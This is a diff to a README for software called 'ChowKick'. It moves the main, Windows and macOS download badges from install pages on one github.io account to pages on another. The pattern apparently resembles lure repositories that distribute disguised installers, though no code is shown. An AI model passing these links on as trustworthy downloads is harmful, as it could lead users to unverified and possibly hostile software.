@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download ChowKick](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_CHOWKICK-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download ChowKick](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_CHOWKICK-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DenFencerStare.github.io/win-get/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **ChowKick** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4A148C?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4A148C?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4A148C?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4A148C?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
 
 </div>
 
